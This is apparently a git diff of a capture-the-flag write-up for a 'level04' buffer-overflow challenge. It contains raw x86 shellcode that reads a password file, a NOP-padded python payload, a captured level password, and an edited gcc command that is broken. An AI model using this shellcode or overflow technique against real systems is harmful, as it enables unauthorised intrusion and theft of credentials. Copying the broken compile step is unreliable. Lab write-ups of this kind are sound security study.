@@ -8,11 +8,10 @@ With [gdb](gdbwriteup.md), we found that the buffer is at 156, so we will have t
 python -c 'print("\x90" + "SHELLCODE ADDRESS") | ./level04'
 ```
 
-We will create a shellcode that will cat the flag, and we will use [this generator](https://masterccc.github.io/tools/shellcode_gen/) to create it.
+We will create a shellcode that will read the file containing the flag, and we will use [this shellcode](http://shell-storm.org/shellcode/files/shellcode-73.html) to create it.
 
 ```bash
-export SHELLCODE=$(\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80
-)
+export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
 ```
 
 Now, we will create a program to find the address of our shellcode.
@@ -31,14 +30,14 @@ int main(int argc, char **argv)
 We will need to compile it with the flag `-m32` to get the address in 32 bits.
 
 ```bash
-gcc -m32 -o getaddr getaddr.c
+gcc -m32 -o main.c
 ./getaddr $SHELLCODE
 ```
 
 Now, we can run our exploit.
 
 ```bash
-python -c 'print("\x90" + "SHELLCODE ADDRESS") | ./level04'
+python -c 'print("\x90" * 156 + "SHELLCODE ADDRESS") | ./level04'
 Give me some shellcode, k
 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
 child is exiting...
